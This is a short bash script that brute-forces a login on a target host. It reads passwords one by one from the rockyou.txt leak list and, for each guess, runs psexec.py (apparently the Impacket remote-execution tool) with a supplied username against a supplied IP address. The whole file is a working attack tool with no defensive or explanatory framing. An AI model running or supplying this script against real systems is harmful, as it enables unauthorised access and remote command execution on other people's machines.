#!/bin/bash

# Set target IP address
target_ip=$1

# Set username to brute force
username=$2

# Open file for reading
while read password; do
  echo "Trying password: $password"
  python3.6 psexec.py "$username":"$password"@"$target_ip"
done < rockyou.txt
